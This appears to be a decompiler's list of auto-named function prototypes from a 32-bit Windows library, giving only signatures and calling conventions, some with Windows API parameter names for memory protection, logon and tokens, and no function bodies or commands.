int __thiscall sub_1001E95B(void *this, int a2);
int __thiscall sub_1001E997(void *this, int a2);
void __thiscall sub_1001E9D3(void *this);
_DWORD *__thiscall sub_1001EA1B(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001EA6E(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001EAC1(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001EB1C(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1001EB77(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1001EBEC(void *this, _DWORD *a2, unsigned int pExceptionObject);
void __thiscall sub_1001EC61(_DWORD *this);
int *__thiscall sub_1001EC86(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1001ECEE(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1001ED56(void *this, int a2);
void __thiscall sub_1001ED8E(void *this, int a2, int a3);
void __thiscall sub_1001EDC9(void *this, int a2);
int __thiscall sub_1001EE01(void *this, int a2);
int __thiscall sub_1001EE3D(void *this, int a2);
void __thiscall sub_1001EE79(void *this);
_DWORD *__thiscall sub_1001EEC1(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001EEE0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001EF00(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001EF20(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001EF40(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001EF5F(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001EF7F(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001EF9E(_DWORD *Block, char a2);
// int __usercall sub_1001EFC3@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1001EFF9@<eax>(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_1001F02A(void *this, int a2);
// int __usercall sub_1001F05D@<eax>(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_1001F09C(void *this, int a2);
// int __usercall sub_1001F0CF@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_1001F10E(void *this, _DWORD *a2);
BOOL __thiscall sub_1001F14B(int this);
BOOL __thiscall sub_1001F15E(_DWORD *this);
int __thiscall sub_1001F168(int this);
void __thiscall sub_1001F196(_DWORD *this);
void __thiscall sub_1001F19A(_DWORD *this);
void __noreturn sub_1001F19E(); // weak
void __noreturn sub_1001F1BB(); // weak
_DWORD *__thiscall sub_1001F1DF(void *this, _DWORD *a2, int a3);
void __thiscall sub_1001F213(_DWORD *this);
bool __thiscall sub_1001F238(int this);
BOOL __thiscall sub_1001F24F(_DWORD *this);
int __thiscall sub_1001F259(int this);
int __thiscall sub_1001F294(int this);
int __thiscall sub_1001F2CA(_DWORD *this);
int __thiscall sub_1001F2F2(int this);
int __thiscall sub_1001F32D(int this, int a2);
_DWORD *__thiscall sub_1001F349(void *this, _DWORD *a2, int a3);
void __thiscall sub_1001F37D(_DWORD *this);
bool __thiscall sub_1001F3A2(int this);
BOOL __thiscall sub_1001F3B9(_DWORD *this);
int __thiscall sub_1001F3C3(int this);
int __thiscall sub_1001F3FE(int this);
int __thiscall sub_1001F434(_DWORD *this);
int __thiscall sub_1001F45C(int this);
int __thiscall sub_1001F497(int this, int a2);
_DWORD *__thiscall sub_1001F4B3(void *this, _DWORD *a2, int a3);
void __thiscall sub_1001F4E7(_DWORD *this);
bool __thiscall sub_1001F50C(int this);
BOOL __thiscall sub_1001F523(_DWORD *this);
int __thiscall sub_1001F52D(int this);
int __thiscall sub_1001F568(int this);
int __thiscall sub_1001F59E(_DWORD *this);
int __thiscall sub_1001F5C6(int this);
int __thiscall sub_1001F601(int this, int a2);
_DWORD *__thiscall sub_1001F61D(void *this, _DWORD *a2, int a3);
void __thiscall sub_1001F651(_DWORD *this);
bool __thiscall sub_1001F676(int this);
BOOL __thiscall sub_1001F68D(_DWORD *this);
int __thiscall sub_1001F697(int this);
int __thiscall sub_1001F6D2(int this);
int __thiscall sub_1001F708(_DWORD *this);
int __thiscall sub_1001F730(int this);
int __thiscall sub_1001F76B(int this, int a2);
_DWORD *__thiscall sub_1001F787(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001F7A7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001F7C7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001F7E6(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001F805(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001F824(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1001F843(_DWORD *a1);
void **__thiscall sub_1001F8CC(void **this, void **a2);
void __thiscall sub_1001F90E(int this);
int __thiscall sub_1001F95D(_DWORD *this);
int __thiscall sub_1001F961(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1001F9BE(int *this, int a2);
int __thiscall sub_1001F9D9(_DWORD *this, unsigned int a2);
int __thiscall sub_1001FA25(_DWORD *this, int a2);
int __thiscall sub_1001FA46(_DWORD *this, int a2);
void __thiscall sub_1001FA67(_DWORD *this, unsigned int a2);
int __thiscall sub_1001FA8C(void **this);
BOOL __thiscall sub_1001FAB0(void *this);
int __thiscall sub_1001FABB(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1001FAFD(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1001FB6F(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_1001FB97(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_1001FBAA(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1001FC08(_DWORD *this);
void **__thiscall sub_1001FCBE(void **this, void **a2);
void __thiscall sub_1001FD00(int this);
int __thiscall sub_1001FD4F(_DWORD *this);
int __thiscall sub_1001FD53(_DWORD *this, _BYTE *a2, unsigned int a3);
int __thiscall sub_1001FDAF(int *this, int a2);
int __thiscall sub_1001FDCA(_DWORD *this, unsigned int a2);
int __thiscall sub_1001FE15(_DWORD *this, int a2);
int __thiscall sub_1001FE33(_DWORD *this, int a2);
void __thiscall sub_1001FE51(_DWORD *this, unsigned int a2);
int __thiscall sub_1001FE76(void **this);
BOOL __thiscall sub_1001FE9A(void *this);
int __thiscall sub_1001FEA5(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1001FEE7(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1001FF5A(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_1001FF82(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_1001FF95(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1001FFE5(_DWORD *this);
void __thiscall sub_10020091(_DWORD *this);
bool __thiscall sub_100200DC(_DWORD *this, _DWORD *a2);
char __thiscall sub_10020116(_DWORD *this, _DWORD *a2);
int __thiscall sub_10020165(_DWORD *this, _DWORD *a2);
int __thiscall sub_100201BD(_DWORD *this, _DWORD *pExceptionObject);
_DWORD *__thiscall sub_10020212(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10020243(_DWORD *this, _DWORD *a2);
int __thiscall sub_10020274(_DWORD *this, int a2);
int __thiscall sub_1002028F(_DWORD *this);
int __thiscall sub_100202A3(_DWORD *this);
_DWORD *__stdcall sub_100202AB(_DWORD *a1);
void __thiscall sub_100202D7(_DWORD *this);
int __thiscall sub_100202FE(_DWORD *this);
BOOL __thiscall sub_1002030A(_DWORD *this, int a2);
int __thiscall sub_10020336(_DWORD *this);
int __thiscall sub_10020342(_DWORD *this, int a2);
int __thiscall sub_10020373(_DWORD *this, int a2);
int __thiscall sub_100203A4(_DWORD *this);
int __thiscall sub_100203B0(_DWORD *this);
int __thiscall sub_100203B8(_DWORD *this);
// _DWORD *__userpurge sub_100203D4@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10020413(void *this);
// _DWORD *__userpurge sub_10020458@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10020497(void *this);
// _DWORD *__userpurge sub_100204C8@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10020507(void *this);
// _DWORD *__userpurge sub_10020546@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10020585(void *this);
// _DWORD *__userpurge sub_100205CA@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10020609(void *this);
void *__thiscall sub_1002063A(void *Block, char a2);
void *__thiscall sub_10020659(void *Block, char a2);
_DWORD *__thiscall sub_10020678(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10020697(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_100206B6@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
// _DWORD *__userpurge sub_10020704@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10020752(_DWORD *a1);
// int __userpurge sub_10020795@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// void __usercall sub_10020828(int a1@<esi>);
// void __usercall sub_10020862(int a1@<esi>);
// void __usercall sub_1002088A(int a1@<esi>);
// void __usercall sub_100208C4(int a1@<esi>);
// void __usercall sub_100208FE(int a1@<esi>);
_DWORD *__stdcall sub_10020926(_DWORD *a1);
_DWORD *__stdcall sub_10020951(_DWORD *a1);
_DWORD *__stdcall sub_1002097C(_DWORD *a1);
_DWORD *__stdcall sub_100209A7(_DWORD *a1);
_DWORD *__stdcall sub_100209E4(_DWORD *a1);
// void *__usercall sub_10020A49@<eax>(int a1@<eax>, _DWORD *a2@<esi>);
// void *__usercall sub_10020A69@<eax>(size_t a1@<eax>, _DWORD *a2@<esi>);
LONG __cdecl sub_10020A8C(int a1, int a2);
int *__cdecl sub_10020B59(int *a1, int a2);
int *__cdecl sub_10020BDD(int *a1, int a2);
int *__cdecl sub_10020C61(int *a1, int a2);
// bool __usercall sub_10020CD2@<al>(int a1@<eax>);
bool __cdecl sub_10020CE9(int a1);
LONG __cdecl sub_10020DAC(int a1, int a2);
int __cdecl sub_10020EB6(int a1, unsigned int a2, void *a3);
int *__cdecl sub_10020FF4(int *a1, int a2, _ThrowInfo *a3);
_DWORD *__thiscall sub_10021257(_DWORD *this, int a2);
// DWORD __usercall sub_100212ED@<eax>(int a1@<esi>);
int sub_1002135C();
LONG __cdecl sub_1002140D(int a1);
DWORD __cdecl sub_100214A5(int a1);
void __thiscall sub_10021589(_DWORD *this);
_DWORD *__thiscall sub_1002159C(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_10021612(_DWORD *this, char a2);
void __thiscall sub_100216B4(_DWORD *this);
_DWORD *__thiscall sub_100216C7(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_1002173D(_DWORD *this, char a2);
// _DWORD *__usercall sub_1002176C@<eax>(int a1@<edi>, _DWORD *a2, int a3);
// void *__usercall sub_10021804@<eax>(int a1@<ecx>, _DWORD *a2@<esi>);
// HANDLE __usercall sub_10021843@<eax>(int a1@<ecx>, int a2@<ebx>);
// HANDLE __usercall sub_100218E9@<eax>(int a1@<ecx>, int a2@<ebx>, int a3);
_DWORD *__cdecl sub_10021998(_DWORD *a1, int a2);
void __cdecl sub_10021A3A(int a1);
bool __cdecl sub_10021BA7(int a1);
bool __thiscall sub_10021C5B(_DWORD *this);
// char __usercall sub_10021C8C@<al>(int a1@<eax>, int a2@<edi>);
void __thiscall sub_10021CC1(void *this);
// _DWORD *__usercall sub_10021CEC@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
_DWORD *__thiscall sub_10021D17(_DWORD *Block, char a2);
// bool __usercall sub_10021D36@<al>(int a1@<esi>);
// void __usercall sub_10021D62(int a1@<esi>);
// BOOL __usercall sub_10021D8A@<eax>(int a1@<eax>);
int __stdcall sub_10021DA7(int a1, int a2, int a3);
void *__thiscall sub_10021DFD(void *Block, char a2);
int __stdcall sub_10021E1C(int a1, int a2, int a3);
int __thiscall sub_10021E6F(int this);
int __thiscall sub_10021EC7(char *this, char a2);
int __thiscall sub_10021EED(_BYTE *this);
unsigned int __thiscall sub_10021F00(void *this, int *a2);
LONG __thiscall sub_10021FEF(_DWORD **this, int *a2);
LONG __thiscall sub_100220BF(_DWORD **this);
char sub_10022158();
int __stdcall sub_1002215B(int a1, int a2);
_BYTE *__thiscall sub_100221EA(_BYTE *Block, char a2);
int __stdcall sub_10022209(int a1, int a2, volatile LONG *lpAddend);
int __thiscall sub_10022277(_BYTE *this);
int __thiscall sub_100222CF(_DWORD **this);
int __thiscall sub_100222DB(_DWORD **this);
int __thiscall sub_100222E7(_DWORD **this);
int __thiscall sub_100222EF(int this);
int __thiscall sub_10022313(_DWORD **this);
int __thiscall sub_1002231B(_DWORD **this, int a2, int a3);
char sub_10022345();
int __stdcall sub_10022348(int a1, int a2, char a3);
_BYTE *__thiscall sub_10022381(_BYTE *Block, char a2);
int __thiscall sub_100223A0(_BYTE *this);
int __thiscall sub_100223E2(_BYTE *this);
int __thiscall sub_10022413(void *this);
int __thiscall sub_1002242A(void *this);
int __thiscall sub_1002243A(void *this);
int __thiscall sub_1002244A(_DWORD *this);
BOOL __thiscall sub_1002244F(void *this);
int __thiscall sub_10022476(void *this);
int __thiscall sub_100224AF(void *this, int a2, int a3);
_DWORD *__stdcall sub_100224F0(_DWORD *a1);
_DWORD *__thiscall sub_1002251E(_DWORD *Block, char a2);
void __thiscall sub_1002253D(_DWORD *this);
_DWORD *__stdcall sub_10022561(_DWORD *a1, int a2, int a3);
_BYTE *__thiscall sub_1002259D(_BYTE *Block, char a2);
int __thiscall sub_100225BC(_BYTE *this);
int __thiscall sub_100225FE(_DWORD *this, int pExceptionObject);
int __thiscall sub_100226A0(_DWORD *this, int pExceptionObject);
char sub_1002271A();
_DWORD *__stdcall sub_1002271D(_DWORD *a1, void *a2, char a3);
_DWORD *__cdecl sub_10022750(_DWORD *a1);
int __thiscall sub_10022785(_DWORD *this, int a2);
_DWORD *__cdecl sub_100227BB(_DWORD *a1, int a2);
_DWORD *__cdecl sub_100227F9(_DWORD *a1, int a2, DWORD a3);
int __cdecl sub_1002285D(int a1, int a2, char a3);
_DWORD *__cdecl sub_10022A14(_DWORD *a1, int a2, int a3, char a4, DWORD a5);
// _DWORD *__usercall sub_10022A56@<eax>(DWORD a1@<ebx>, _DWORD *a2, DWORD dwDesiredAccess);
_DWORD *__cdecl sub_10022AB1(_DWORD *a1, int a2, char pExceptionObject);
_DWORD *__cdecl sub_10022B4F(_DWORD *a1, int a2, int *a3, int a4, char pExceptionObject);
DWORD __thiscall sub_10022BF7(_DWORD *this);
int __thiscall sub_10022C53(_DWORD *this);
_DWORD *__thiscall sub_10022D51(_DWORD *this, int a2);
_DWORD *__thiscall sub_10022D89(_DWORD *Block, char a2);
bool __thiscall sub_10022DA8(_DWORD *this, UINT uExitCode);
_DWORD *__thiscall sub_10022DEC(_DWORD *this, _DWORD *a2, DWORD pExceptionObject);
_DWORD *__thiscall sub_10022E7B(_DWORD *this, _DWORD *a2);
int __thiscall sub_10022F60(void *this, int a2, int a3, int a4);
int __thiscall sub_10022F96(_DWORD *this, int a2, SIZE_T dwSize, DWORD flProtect, DWORD flAllocationType);
int __thiscall sub_10023024(void *this, int a2, char a3, char a4, char a5);
char __thiscall sub_100230AE(void *this, int *a2);
_DWORD *__cdecl sub_10023112(_DWORD *a1, int a2, int a3);
_DWORD *__cdecl sub_10023290(_DWORD *a1, char *a2, char *a3);
_DWORD *__thiscall sub_10023355(_DWORD *this, _DWORD *a2, int a3, char *a4, char a5, int Block);
_DWORD *__thiscall sub_10023E0B(_DWORD *this, _DWORD *a2, DWORD DesiredAccess);
DWORD __thiscall sub_10023E70(_DWORD *this);
DWORD __thiscall sub_10023EAB(void *this, int a2);
int __thiscall sub_10023FD6(void *this, int a2, int a3);
int __thiscall sub_10024613(int *this, int a2, int a3);
int __thiscall sub_10024631(void *this, int a2);
// _DWORD *__usercall sub_1002465F@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_1002469A(void *this);
// void __usercall sub_100246C5(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_10024708(int a1@<esi>);
HMODULE __cdecl sub_1002475C(LPCSTR lpModuleName);
HMODULE __cdecl sub_1002476A(LPCWSTR lpModuleName);
HMODULE __cdecl sub_10024778(int a1, int a2);
char *__cdecl sub_100247C6(char *a1, int a2);
char *__cdecl sub_1002481B(int a1, int a2, int a3);
// void __usercall sub_10024892(_DWORD *a1@<esi>, HMODULE hModule);
// _BYTE *__usercall sub_10024909@<eax>(_BYTE *result@<eax>);
char *__cdecl sub_1002491F(char *lp, LPCSTR lpsz);
_DWORD *__thiscall sub_10024AE4(_DWORD *this);
_DWORD *__stdcall sub_10024B21(_DWORD *a1, void *a2);
bool __thiscall sub_10024B5F(_DWORD *this);
_DWORD *__stdcall sub_10024B86(_DWORD *a1, int a2, int a3, LPCWSTR lpszUsername, DWORD dwLogonType, DWORD dwLogonProvider);
int __thiscall sub_10024C2E(_DWORD *this);
int __thiscall sub_10024C32(_DWORD *this);
int __thiscall sub_10024C73(_DWORD *this);
// void __userpurge sub_10024CB4(int a1@<eax>, int a2);
_DWORD *__stdcall sub_10024CDE(_DWORD *a1, int a2);
// int __userpurge sub_10024D28@<eax>(int a1@<eax>, int a2);
_DWORD *__thiscall sub_10024D3F(_DWORD *this, _DWORD *a2);
int *__cdecl sub_10024E14(int *a1);
int *__cdecl sub_10025061(int *a1);
DWORD __thiscall sub_1002519E(void *this, int a2);
DWORD __thiscall sub_100251B0(void *this, int a2);
// DWORD __userpurge sub_100251C2@<eax>(char a1@<al>, int a2, int a3);
_DWORD *__thiscall sub_1002525C(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100252AF(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10025302(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1002535D(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100253B8(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1002542D(void *this, _DWORD *a2, unsigned int pExceptionObject);
void __thiscall sub_100254A2(_DWORD *this);
int *__thiscall sub_100254C7(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1002552F(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_10025597(void *this, int a2);
void __thiscall sub_100255CF(void *this, int a2, int a3);
void __thiscall sub_1002560A(void *this, int a2);
int __thiscall sub_10025642(void *this, int a2);
int __thiscall sub_1002567E(void *this, int a2);
void __thiscall sub_100256BA(void *this);
_DWORD *__thiscall sub_10025709(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10025728(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10025748(_DWORD *Block, char a2);
// int __usercall sub_1002576D@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_100257B1@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_100257E2(void *this, _DWORD *a2, int a3);
void __thiscall sub_10025816(_DWORD *this);
bool __thiscall sub_1002583B(int this);
BOOL __thiscall sub_10025852(_DWORD *this);
int __thiscall sub_1002585C(int this);
int __thiscall sub_10025897(int this);
int __thiscall sub_100258CD(_DWORD *this);
int __thiscall sub_100258F5(int this);
int __thiscall sub_10025930(int this, int a2);
_DWORD *__thiscall sub_1002594C(void *this, _DWORD *a2, int a3);
void __thiscall sub_10025980(_DWORD *this);
bool __thiscall sub_100259A5(int this);
BOOL __thiscall sub_100259BC(_DWORD *this);
int __thiscall sub_100259C6(int this);
int __thiscall sub_10025A01(int this);
int __thiscall sub_10025A37(_DWORD *this);
int __thiscall sub_10025A5F(int this);
int __thiscall sub_10025A9A(int this, int a2);
_DWORD *__thiscall sub_10025AB6(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10025AD5(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_10025B12@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10025B60(_DWORD *a1);
int *__thiscall sub_10025B92(int *this, int *a2);
void __thiscall sub_10025BE9(_DWORD *this);
int __thiscall sub_10025C4C(_DWORD *this);
int __thiscall sub_10025C50(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_10025CC4(int *this, int a2);
int __thiscall sub_10025CDF(_DWORD *this, unsigned int a2);
int __thiscall sub_10025D4C(_DWORD *this, int a2);
int __thiscall sub_10025D6D(_DWORD *this, int a2);
void __thiscall sub_10025D8E(_DWORD *this, unsigned int a2);
int __thiscall sub_10025DC9(int *this);
BOOL __thiscall sub_10025E02(void *this);
int __thiscall sub_10025E0D(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10025E64(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_10025EE0(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10025F08(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10025F1B(_DWORD *this, int a2, int a3, void *Block);
void __thiscall sub_10025FC1(_DWORD *this);
// _DWORD *__userpurge sub_100260EA@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10026129(void *this);
// _DWORD *__userpurge sub_1002616E@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100261AD(void *this);
_DWORD *__thiscall sub_100261DE(_DWORD *Block, char a2);
char *__thiscall sub_100261FD(char *Block, char a2);
_DWORD *__stdcall sub_10026247(_DWORD *a1);
// void __usercall sub_10026272(_DWORD *a1@<edi>);
// void __usercall sub_100262ED(int a1@<esi>);
// void __usercall sub_10026327(int a1@<esi>);
_DWORD *__stdcall sub_10026363(_DWORD *a1);
_DWORD *__stdcall sub_100263C8(_DWORD *a1, int a2, void *a3, void *Block);
// _DWORD *__userpurge sub_10026439@<eax>(int a1@<edi>, _DWORD *a2);
LONG __thiscall sub_100264A5(int *this);
_DWORD *__stdcall sub_100264D8(_DWORD *a1, int a2);
int *__thiscall sub_1002651B(int *Block, char a2);
void __thiscall sub_1002653A(int *this);
int __stdcall sub_1002659B(_DWORD *a1);
// int __usercall sub_1002667B@<eax>(_DWORD *a1@<esi>);
_DWORD *__stdcall sub_10026745(_DWORD *a1);
void __thiscall sub_1002677C(_DWORD *this);
void *__thiscall sub_100267D3(void *this, int a2);
void *__thiscall sub_100267E8(void *this, int a2);
int __thiscall sub_100267FD(_DWORD *this);
_DWORD *__thiscall sub_10026801(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10026857(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100268AD(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10026903(int *this, _DWORD *a2);
void __thiscall sub_10026959(_DWORD *this);
int *__thiscall sub_1002697E(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_100269E6(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_10026A4E(void *this, int a2);
void __thiscall sub_10026A86(void *this, int a2, int a3);
void __thiscall sub_10026AC1(void *this, int a2);
int __thiscall sub_10026AF9(void *this, int a2);
int __thiscall sub_10026B35(void *this, int a2);
void __thiscall sub_10026B71(void *this);
_DWORD *__thiscall sub_10026BCA(_DWORD *Block, char a2);
int *__stdcall sub_10026BE9(int *Block);
_DWORD *__thiscall sub_10026C04(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10026C23(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10026C43(_DWORD *Block, char a2);
LONG __stdcall sub_10026C63(int *a1);
// void __usercall sub_10026C83(int a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_10026CDF(_DWORD *a1);
// int __usercall sub_10026D0A@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_10026D4A@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10026D7B(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_10026DB5(_DWORD *this);
BOOL __thiscall sub_10026DDA(_DWORD *this);
BOOL __thiscall sub_10026DE3(_DWORD *this);
int __thiscall sub_10026DEC(_DWORD *this);
int __thiscall sub_10026E10(_DWORD *this);
int __thiscall sub_10026E3D(_DWORD *this);
int *__thiscall sub_10026E6A(int this);
_DWORD *__thiscall sub_10026EE0(_DWORD *this, int a2);
_DWORD *__thiscall sub_10026F65(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_10026F9F(_DWORD *this);
BOOL __thiscall sub_10026FC4(_DWORD *this);
BOOL __thiscall sub_10026FCD(_DWORD *this);
int __thiscall sub_10026FD6(_DWORD *this);
int __thiscall sub_10026FFA(_DWORD *this);
int __thiscall sub_10027027(_DWORD *this);
int *__thiscall sub_10027054(int this);
_DWORD *__thiscall sub_100270CA(_DWORD *this, int a2);
_DWORD *__thiscall sub_1002714F(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1002716E(_DWORD *Block, char a2);
_DWORD *__stdcall sub_100271A2(_DWORD *a1, int a2, int a3, int a4, int a5, int a6);
// _DWORD *__userpurge sub_100271EB@<eax>(_DWORD *a1@<esi>, int a2);
// _DWORD *__userpurge sub_10027241@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10027280(void *this);
// _DWORD *__userpurge sub_100272C5@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10027304(void *this);
// void __usercall sub_10027347(int a1@<esi>);
// void __usercall sub_10027381(int a1@<esi>);
// BOOL __userpurge sub_100273BD@<eax>(_DWORD *a1@<eax>, _DWORD *a2);
int __thiscall sub_100273E8(int *this, int a2);
int __thiscall sub_100274A1(int *this, int a2);
int __thiscall sub_10027523(int *this);
int *__stdcall sub_1002759F(int *a1, int *a2, int a3);
// int __usercall sub_10027677@<eax>(int a1@<ecx>, int *a2@<ebx>);
int __thiscall sub_100276F4(_DWORD *this, int *a2);
// int __usercall sub_1002777B@<eax>(int *a1@<ecx>, int a2@<ebx>);
void __fastcall sub_10027814(int a1, int a2, int *a3, int a4);
// int __userpurge sub_1002785C@<eax>(int a1@<esi>, _DWORD *a2);
_DWORD *__thiscall sub_100278EA(_DWORD *Block, char a2);
// int __usercall sub_10027909@<eax>(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_10027930(_DWORD *this);
// _DWORD *__usercall sub_10027966@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
int __stdcall sub_1002798B(int a1, int a2, int a3);
// bool __userpurge sub_10027A0E@<al>(int a1@<esi>, void *a2);
BOOL __thiscall sub_10027AA1(_BYTE *this);
_DWORD *__stdcall sub_10027B8C(_DWORD *a1, int a2);
int __thiscall sub_10027BFC(_DWORD *this);
_DWORD *__stdcall sub_10027C51(_DWORD *a1);
int __thiscall sub_10027CA8(_DWORD *this);
_DWORD *__stdcall sub_10027CD4(_DWORD *a1);
int __thiscall sub_10027D2B(_DWORD *this);
_DWORD *__stdcall sub_10027D57(_DWORD *a1);
int __thiscall sub_10027DAE(_DWORD *this);
_DWORD *__stdcall sub_10027DDA(_DWORD *a1, int a2);
char *__thiscall sub_10027E37(char *this, char a2);
// void __usercall sub_10027E59(int a1@<eax>);
int __thiscall sub_10027E6E(_DWORD *this);
_DWORD *__stdcall sub_10027E9A(_DWORD *a1);
int __thiscall sub_10027EF1(_DWORD *this);
_DWORD *__stdcall sub_10027F1D(_DWORD *a1);
_DWORD *__thiscall sub_10027F6E(_DWORD *this, char a2);
void __thiscall sub_10027F9A(_DWORD *this);
int __thiscall sub_10027FAB(_DWORD *this);
_DWORD *__stdcall sub_10027FE0(_DWORD *a1, int a2);
int __thiscall sub_1002803D(_DWORD *this);
_DWORD *__stdcall sub_10028069(_DWORD *a1);
int __thiscall sub_100280C0(_DWORD *this);
// void __usercall sub_100280EC(_DWORD *a1@<edi>);
_DWORD *__thiscall sub_10028183(_DWORD *this, _DWORD *a2, int a3);
// void __usercall sub_100281F2(_DWORD *a1@<edi>);
// void __usercall sub_10028289(_DWORD *a1@<edi>);
// void __usercall sub_10028320(_DWORD *a1@<edi>);
// void __usercall sub_100283B7(_DWORD *a1@<esi>, int a2, int a3, int a4, int a5);
_DWORD *__cdecl sub_1002844F(_DWORD *a1);
int *__thiscall sub_100284A5(int *this);
int *__stdcall sub_100284F7(int a1, int a2, HANDLE hToken);
LPVOID *__thiscall sub_10028556(LPVOID *Block, char a2);
BOOL __thiscall sub_10028575(LPVOID *this);
int __thiscall sub_100285A8(_DWORD *this);
int *__cdecl sub_100285B2(int *a1, int a2);
_DWORD *__stdcall sub_100286E3(_DWORD *a1);
_DWORD *__thiscall sub_10028711(_DWORD *Block, char a2);
void __thiscall sub_10028730(_DWORD *this);
// int __userpurge sub_10028754@<eax>(int a1@<ecx>, int a2@<edi>, int a3, int a4);
void *__thiscall sub_100287D9(void *Block, char a2);
int __stdcall sub_100287F8(int a1);
int __thiscall sub_10028854(int this);
// SIZE_T __userpurge sub_100288D0@<eax>(int a1@<esi>, PMEMORY_BASIC_INFORMATION lpBuffer);
// _DWORD __stdcall sub_10028963(_DWORD, _DWORD); weak
// int __userpurge sub_100289BC@<eax>(int a1@<edi>, _DWORD *a2);
// DWORD __usercall sub_100289F8@<eax>(int a1@<esi>);
char *__thiscall sub_10028A0C(char *this);
// DWORD __usercall sub_10028A10@<eax>(int a1@<esi>);
// BOOL __usercall sub_10028A34@<eax>(int a1@<esi>);
// BOOL __usercall sub_10028A44@<eax>(int a1@<esi>);
int __thiscall sub_10028AAA(int this, DWORD pExceptionObject);
int __thiscall sub_10028B37(_DWORD *this);
// DWORD __userpurge sub_10028B3E@<eax>(int a1@<edi>, DWORD flNewProtect);
int __thiscall sub_10028BB4(_DWORD *this, _DWORD *a2);
LONG __thiscall sub_10028CEB(void *this, char a2);
int __thiscall sub_10028D29(_DWORD *this);
unsigned int __thiscall sub_10028D2D(_DWORD *this, unsigned int pExceptionObject, int a3);
